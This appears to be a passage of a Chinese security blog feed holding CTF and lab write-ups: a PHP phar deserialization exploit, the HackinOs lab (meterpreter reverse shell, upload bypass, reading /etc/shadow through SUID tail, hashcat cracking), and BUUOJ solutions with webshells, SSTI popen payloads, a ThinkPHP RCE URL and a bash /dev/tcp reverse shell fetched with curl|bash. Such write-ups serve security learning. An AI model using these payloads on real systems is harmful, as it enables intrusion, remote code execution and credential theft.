class="hljs-keyword">$this</span>-&gt;db-&gt;prepare(<span class="hljs-string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);        $stmt-&gt;bind_param(<span class="hljs-string">"s"</span>, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count = $stmt-&gt;num_rows;        <span class="hljs-keyword">if</span> ($count === <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_user</span><span class="hljs-params">($username, $password)</span> </span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;user_exist($username)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        &#125;        $password = sha1($password . <span class="hljs-string">"SiAchGHmFx"</span>);        $stmt = <span class="hljs-keyword">$this</span>-&gt;db-&gt;prepare(<span class="hljs-string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);        $stmt-&gt;bind_param(<span class="hljs-string">"ss"</span>, $username, $password);        $stmt-&gt;execute();        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify_user</span><span class="hljs-params">($username, $password)</span> </span>&#123;        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;user_exist($username)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        &#125;        $password = sha1($password . <span class="hljs-string">"SiAchGHmFx"</span>);        $stmt = <span class="hljs-keyword">$this</span>-&gt;db-&gt;prepare(<span class="hljs-string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);        $stmt-&gt;bind_param(<span class="hljs-string">"s"</span>, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;db-&gt;close();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;    <span class="hljs-keyword">private</span> $files;    <span class="hljs-keyword">private</span> $results;    <span class="hljs-keyword">private</span> $funcs;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($path)</span> </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();        <span class="hljs-keyword">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();        <span class="hljs-keyword">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();        $filenames = scandir($path);        $key = array_search(<span class="hljs-string">"."</span>, $filenames);        <span class="hljs-keyword">unset</span>($filenames[$key]);        $key = array_search(<span class="hljs-string">".."</span>, $filenames);        <span class="hljs-keyword">unset</span>($filenames[$key]);        <span class="hljs-keyword">foreach</span> ($filenames <span class="hljs-keyword">as</span> $filename) &#123;            $file = <span class="hljs-keyword">new</span> File();            $file-&gt;open($path . $filename);            array_push(<span class="hljs-keyword">$this</span>-&gt;files, $file);            <span class="hljs-keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="hljs-keyword">array</span>();        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">($func, $args)</span> </span>&#123;        array_push(<span class="hljs-keyword">$this</span>-&gt;funcs, $func);        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;files <span class="hljs-keyword">as</span> $file) &#123;            <span class="hljs-keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;        $table = <span class="hljs-string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;        $table .= <span class="hljs-string">'&lt;thead&gt;&lt;tr&gt;'</span>;        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> $func) &#123;            $table .= <span class="hljs-string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="hljs-string">'&lt;/th&gt;'</span>;        &#125;        $table .= <span class="hljs-string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;        $table .= <span class="hljs-string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;results <span class="hljs-keyword">as</span> $filename =&gt; $result) &#123;            $table .= <span class="hljs-string">'&lt;tr&gt;'</span>;            <span class="hljs-keyword">foreach</span> ($result <span class="hljs-keyword">as</span> $func =&gt; $value) &#123;                $table .= <span class="hljs-string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="hljs-string">'&lt;/td&gt;'</span>;            &#125;            $table .= <span class="hljs-string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="hljs-string">'"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'</span>;            $table .= <span class="hljs-string">'&lt;/tr&gt;'</span>;        &#125;        <span class="hljs-keyword">echo</span> $table;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;    <span class="hljs-keyword">public</span> $filename;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span><span class="hljs-params">($filename)</span> </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;filename = $filename;        <span class="hljs-keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> basename(<span class="hljs-keyword">$this</span>-&gt;filename);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>&#123;        $size = filesize(<span class="hljs-keyword">$this</span>-&gt;filename);        $units = <span class="hljs-keyword">array</span>(<span class="hljs-string">' B'</span>, <span class="hljs-string">' KB'</span>, <span class="hljs-string">' MB'</span>, <span class="hljs-string">' GB'</span>, <span class="hljs-string">' TB'</span>);        <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $size &gt;= <span class="hljs-number">1024</span> &amp;&amp; $i &lt; <span class="hljs-number">4</span>; $i++) $size /= <span class="hljs-number">1024</span>;        <span class="hljs-keyword">return</span> round($size, <span class="hljs-number">2</span>).$units[$i];    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span><span class="hljs-params">()</span> </span>&#123;        unlink(<span class="hljs-keyword">$this</span>-&gt;filename);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);    &#125;&#125;<span class="hljs-meta">?&gt;</span></span></code></pre><p>可以看到在file类中有个file_get_contents函数可以获得文件内容，帮助我们获取flag，所以我们要去触发他，有注意到file类中有unlink函数<br>这个可以触发phar反序列化，我们梳理一下思路：<br>首先我们要调用close（）方法，在User类中的析构函数中会调用close()方法，然后我们注意到在FileList类的构造方法里面创建了File对象，在魔术方法__call里面，如果对应的方法在FilelIST类里面没有的话，就执行File对象的这个方法，同时将执行结果储存在results数组里面，所以我们new一个对象User将其db变量变成一个Filelist对象，然后当User类销毁的时候，会调用db中的close方法，由于Filelist中不存在close方法，它会调用File中的close方法，然后输出flag<br>，我们先生成一个phar文件</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;    <span class="hljs-keyword">public</span> $db;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;        <span class="hljs-keyword">public</span> $filename;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;    <span class="hljs-keyword">private</span> $files;    <span class="hljs-keyword">private</span> $results;    <span class="hljs-keyword">private</span> $funcs;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>&#123;        $file = <span class="hljs-keyword">new</span> File();        $file-&gt;filename = <span class="hljs-string">'/flag.txt'</span>;        <span class="hljs-keyword">$this</span>-&gt;files = <span class="hljs-keyword">array</span>($file);        <span class="hljs-keyword">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();        <span class="hljs-keyword">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();    &#125;&#125;$b=<span class="hljs-keyword">new</span> FileList();$c=<span class="hljs-keyword">new</span> User();$c-&gt;db=$b;$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">"phar.phar"</span>);$phar-&gt;startBuffering();$phar-&gt;setStub(<span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span>$phar-&gt;setMetadata($c); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>$phar-&gt;addFromString(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span><span class="hljs-comment">//签名自动计算</span>$phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></span></code></pre><p>上传抓包后将文件名改为phar.gif，修改content-type位image/gif成功上传，然后要调用unlink函数所以要执行删除操作，删除，抓包之后<br>将filename的参数修改为phar://phar.gif，在响应中拿到flag</p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HackinOs</title>
    <link href="/2020/04/06/HackinOs/"/>
    <url>/2020/04/06/HackinOs/</url>
    
    <content type="html"><![CDATA[<!-- toc --><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>首先，nmap确定靶机地址：192.168.80.4，然后再nmap -A走一波<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7181.JPG" srcset="/img/loading.gif" alt="picture"><br>发现开放了8000端口，看起来应该是个博客，访问了一下<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7182.JPG" srcset="/img/loading.gif" alt="picture"><br>看见了一个疑似sql注入点，但是试了一下好像不行 ，并且它会自动跳转到localhost，所以就很难进行下去，不过<br>之前nmap扫出来，他还有个upload.php，于是访问一下，看到了一个文件上传的点，然后看页面源代码的话会发现。他给了我们一个提示，他把源码上传到了github，然后好像现在好像已经被删了，就只能看看别人的wp里的源码</p><!-- toc --><h3 id="文件上传漏洞利用"><a href="#文件上传漏洞利用" class="headerlink" title="文件上传漏洞利用"></a>文件上传漏洞利用</h3><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">"center"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">""</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">"multipart/form-data"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Select image : <span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: solid;"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"submit"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">// Check if image file is a actual image or fake image</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">"submit"</span>])) &#123;$rand_number = rand(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>);  <span class="hljs-comment">//生成随机数</span>$target_dir = <span class="hljs-string">"uploads/"</span>;    <span class="hljs-comment">//上传路径</span>     <span class="hljs-comment">//将上传的文件名更改为使用md5加密后的名称</span>$target_file = $target_dir . md5(basename($_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>].$rand_number));$file_name = $target_dir . basename($_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>]);$uploadOk = <span class="hljs-number">1</span>;$imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));$type = $_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"type"</span>];$check = getimagesize($_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>]);        <span class="hljs-comment">//如果上传的文件类型属于这种类型</span><span class="hljs-keyword">if</span>($check[<span class="hljs-string">"mime"</span>] == <span class="hljs-string">"image/png"</span> || $check[<span class="hljs-string">"mime"</span>] == <span class="hljs-string">"image/gif"</span>)&#123; $uploadOk = <span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">else</span>&#123;$uploadOk = <span class="hljs-number">0</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">":)"</span>;&#125;   <span class="hljs-keyword">if</span>($uploadOk == <span class="hljs-number">1</span>)&#123;  <span class="hljs-comment">//uploadOk为1，上传文件</span>      move_uploaded_file($_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>], $target_file.<span class="hljs-string">"."</span>.$imageFileType);      <span class="hljs-keyword">echo</span> <span class="hljs-string">"File uploaded /uploads/?"</span>;  &#125;&#125;<span class="hljs-meta">?&gt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>用 getimagesize检测文件类型，那我们只要改一下文件头就行了加上一个GIF就可以绕过，然后这次打算用Meterpreter来生成php后面进行渗透，因为也是我第一次使用msf，这里详细记录一下<br>我们首先用msf的侦听模块生成一个反弹shell</p><pre><code class="hljs angelscript">msfvenom -p php/meterpreter/reverse_tcp lhost=<span class="hljs-number">192.168</span><span class="hljs-number">.80</span><span class="hljs-number">.3</span> lport=<span class="hljs-number">6666</span> -f raw</code></pre><p>1<a href="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7193.JPG" target="_blank" rel="noopener"></a><br>然后用burpsuite抓包改包，在文件头上加上GIF，成功上传<br>再打开Metasploit，在exploit/multi/handler模块中设置Payload和监听主机、监听端口等参数<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7194.JPG" srcset="/img/loading.gif" alt><br>要连接我们的shell还需要kail访问一下我们上传的文件，这里就有问题了。通过之前的源码我们发现，它是对我们上传的文件进行了重命名，好在他的重命名不是特别复杂，首先生成一个0到100的随机数然后给我们的文件名加上这个随机数之后进行md5编码，那我们可以写个脚本来帮助我们访问</p><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">101</span>):    file_name=hashlib.md5(<span class="hljs-string">'1234.php'</span>+str(i)).hexdigest()    r=requests.<span class="hljs-keyword">get</span>(<span class="hljs-string">'http://192.168.80.4:8000/uploads/&#123;&#125;.php'</span>.format(file_name))    <span class="hljs-keyword">if</span> <span class="hljs-string">'404'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:        print r.text</code></pre><p>运行一下脚本，可以发现我们已经连接上了</p><!-- toc --><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7186.JPG" srcset="/img/loading.gif" alt="picture"><br>刚开始肯定是低权限的账户肯定是需要我们提权的，这时候我们可以用meterpreter上传脚本来搜集信息<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7188.JPG" srcset="/img/loading.gif" alt="picture"><br>这里看到有个/user/bin/tail 文件被设置了suid，说明我们即使是低权限也可以用tail命令，那就可以用这个去读一些关键的文件，我们读一下/etc/shadow这个文件来获取账号密码</p><pre><code class="hljs awk">tail -cG <span class="hljs-regexp">/etc/</span>shadow</code></pre><p>拿到了root用户密码的hash值，然后我们需要爆破这个hash值，可以用kail自带的hashcat来进行爆破</p><pre><code class="hljs angelscript">hashcat -a <span class="hljs-number">0</span> -m <span class="hljs-number">1800</span> -o found.txt <span class="hljs-number">1.</span>hash /usr/share/wordlists/rockyou.txt</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7195.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7196.JPG" srcset="/img/loading.gif" alt="picture"><br>最后爆破出来密码是john，紧接着我们su root但是提示说需要一个交互式shell，我们可以执行python脚本</p><pre><code class="hljs swift">python –<span class="hljs-built_in">c</span> “<span class="hljs-keyword">import</span> pyt;pty.spawn(‘/bin/bash’);”</code></pre><p>这里用的是pty模块，这个模块定义了处理伪终端概念的操作,而spwan函数的作用生成一个进程，并将其控制终端连接到当前进程的标准IO<br>运行之后就得到了一个交互式的shell然后再su root成功,然后在家目录下找到flag<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7190.JPG" srcset="/img/loading.gif" alt="picture"><br>不过看网上的别人写的渗透过程对比发现这好像不是最终的flag，那我当时也没继续下去，所以先留着，到时候再补上</p>]]></content>
    
    
    <categories>
      
      <category>渗透实战</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buuoj刷题</title>
    <link href="/2020/03/19/buuoj%E5%88%B7%E9%A2%98/"/>
    <url>/2020/03/19/buuoj%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<!-- toc --><h3 id="2019SUCTF"><a href="#2019SUCTF" class="headerlink" title="2019SUCTF"></a>2019SUCTF</h3><p>1.checkin<br>一道文件上传的题目，直接上传php被拦截，改后缀名上传，发现&lt;?,被过滤了，改一下脚本</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">"php"</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">'a'</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>改完之后居然还是报错了！！不过他给了提示报错内容为：exif_imagetype:not image! ，这应该是对文件格式进行了检查。继续尝试发现，应该只是检测了文件头<br>，所以上传一个简单的图片马即可，但是这上传的只是一个图片形式，这题目也没有文件包含的漏洞可以给我们利用，想尝试.htaccess来让他把jpg文件当作php执行，但是尝试了一下，<br>失败了，看了wp才知道要用.user.ini,以前从来没有听说过呀，具体原理可以看看这个大佬的文章<a href="https://wooyun.js.org/drops/user.ini文件构成的php后门.html、" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini文件构成的php后门.html、</a><br>大致意思就是，在.user.ini文件中添加内容：auto_prepend_file=xxx.jpg,那么在所有的php文件执行前都会把xxx.jpg 当作php文件先执行一遍，它类似于.htaccess文件，但是应用比他更广</p><p>于是我们可以这样子，先上传一个.user.ini ，其内容为：</p><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=webshell.jpg</code></pre><p>然后在上传我们的一句话木马<br><img src="https://github.com/gee617/picture/raw/master/2.JPG" srcset="/img/loading.gif" alt><br>访问index.php可以看到，我们的webshell.jpg已经被当作php文件中执行了<br><img src="https://github.com/gee617/picture/raw/master/1.JPG" srcset="/img/loading.gif" alt><br>最后system(“cat /flag”);拿到flag<br>2.easysql<br>修改sql_modesql_mode，利用“||”拼接字符串，然后直接查询flag<br>3.pythonginx<br>unicode编码问题,例如字符℆ 在后台转码会解析为c/u，以此来绕过if判断</p><!-- toc --><h3 id="BJDCTF"><a href="#BJDCTF" class="headerlink" title="BJDCTF"></a>BJDCTF</h3><p>这几天做了一下BUUOJ上的BJDCTF的题目，写一下自己的wp</p><p>1.fake google<br>查看源代码，提示是SSTI注入，这就好办了</p><pre><code class="hljs clojure">&#123;&#123;<span class="hljs-string">""</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()&#125;&#125;</code></pre><p>查看可用的类，发现有一个os._wrap_close的类，这个是可以供我们使用的</p><pre><code class="hljs markdown">&#123;&#123;"".<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">117</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">'popen'</span>](<span class="hljs-link">'ls /'</span>).read()&#125;&#125;</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7178.JPG" srcset="/img/loading.gif" alt><br>查看根目录，发现flag就在根目录下，于是最终payload</p><pre><code class="hljs markdown">&#123;&#123;"".<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">117</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">'popen'</span>](<span class="hljs-link">'ls'</span>).read()&#125;&#125;</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7178.JPG" srcset="/img/loading.gif" alt><br>2.old hack<br>这道题告诉了我们tp的版本是5.023，应该是想让我们用现成的漏洞吧，找了篇复现这个漏洞的文章<a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a><br>利用方式是这样的</p><pre><code class="hljs oxygene">http:<span class="hljs-comment">//ip_addr/index.php?s=captcha</span>(post)_method=__construct&amp;filter[]=system&amp;<span class="hljs-function"><span class="hljs-keyword">method</span>=<span class="hljs-title">get</span>&amp;<span class="hljs-title">get</span>[]=<span class="hljs-title">ls</span> /</span></code></pre><p>列出了根目录，然后直接查看flag即可<br>3.duangshell<br>下载备份文件后，拿到了源码</p><pre><code class="hljs xquery"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>    </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>give me a girl<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><span class="xml"></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>珍爱网<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><span class="xml">&lt;?phperror_reporting(0);echo "how can i give you source code? .swp?!"."</span><span class="xml"><span class="php">&lt;br&gt;<span class="hljs-string">";if (!isset($_POST['girl_friend'])) </span></span></span><span class="xquery">&#123;    die(<span class="hljs-string">"where is P3rh4ps's girl friend ???"</span>);&#125;</span><span class="xml"><span class="php"> <span class="hljs-keyword">else</span> </span></span><span class="xquery">&#123;    <span class="hljs-variable">$girl</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'];    if (preg_match('</span>/\&gt;|\\\/<span class="hljs-string">', $girl)) &#123;        die('</span>just girl<span class="hljs-string">');    &#125;</span></span><span class="xml"><span class="php"> <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, $girl)) </span></span><span class="xquery"><span class="hljs-string">&#123;        echo "&lt;img src='</span>img/p3_need_beautiful_gf.png<span class="hljs-string">'&gt; &lt;!-- He is p3 --&gt;";    &#125;</span></span><span class="xml"><span class="php"> <span class="hljs-keyword">else</span> </span></span><span class="xquery"><span class="hljs-string">&#123;        //duangShell~~~~        exec($girl);    &#125;</span></span><span class="xml"><span class="php">&#125;</span></span></code></pre><p>发现过滤了一堆东西，于是就想着用反弹shell试试，结合前面的提示，开个小号，新建一个靶机，因为这道题过滤了一堆东西，所以直接写一句话反弹shell肯定行不通，所以我们可以利用curl命令<br>现在新开的靶机中在/var/www/html下新建一个shell.txt文件,然后将一句话反弹shell写进去;</p><pre><code class="hljs routeros">bash -i &gt;&amp; /dev/tcp/ip<span class="hljs-built_in">/port </span>0&gt;&amp;1</code></pre><p>然后再把靶机上监听相应的端口，再给girl_friend传值：</p><pre><code class="hljs dockerfile">curl http://ipaddr/<span class="hljs-keyword">shell</span>.<span class="bash">txt|bash</span></code></pre><p>成功反弹shell，然后这道题根目录下的flag是假的，用find命令查找flag即可</p><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> “<span class="hljs-built_in">flag</span>”</code></pre><p>4.假猪套天下第一<br>这道题随便输用户名密码登陆后有个跳转，抓包看看有提示L0g1in.php，然后就是根据他的提示一步步的补充修改http headrs即可<br>5.easyMD5<br>ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password=’’ or ‘6xxxxx’<br>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数<br>6.Mark love cats:$$导致的变量覆盖<br>7.mystery of ip:基于Twig模板的ssti注入用现成的</p><pre><code class="hljs reasonml">payload&#123;&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_self</span>.</span></span>env.register<span class="hljs-constructor">UndefinedFilterCallback(<span class="hljs-string">"exec"</span>)</span>&#125;&#125;&#123;&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_self</span>.</span></span>env.get<span class="hljs-constructor">Filter(<span class="hljs-string">"id"</span>)</span>&#125;&#125;</code></pre><p>即可</p><!-- toc --><h3 id="极客大挑战"><a href="#极客大挑战" class="headerlink" title="极客大挑战"></a>极客大挑战</h3><p>1.sql注入系列<br>easysql:万能密码即可<br>lovesql：没有什么过滤的sql注入，拼接常规的sql注入语句即可<br>babysql:双写绕过<br>hardsql：报错注入<br>finalsql：用异或构造布尔盲注<br>2.havefun：get传参即可获得flag<br>3.secretfile:file伪协议读取文件<br>4.php:简单的反序列化，绕过_wakeup函数即可<br>5.knife：菜刀直接连即可<br>6.http：按照提示，一步步修改http请求头即可<br>7.buyflag；数组绕过strcmp函数即可<br>8.upload:1.phtml绕过黑名单检测2.增加文件头GIF89a绕过图像检测<br>9.RCEME:1.url编码取反绕过正则检测2.重新写入一个shell用蚁剑连接3.上传php7的poc绕过disabled-functions（<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php）" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php）</a></p><!-- toc --><h3 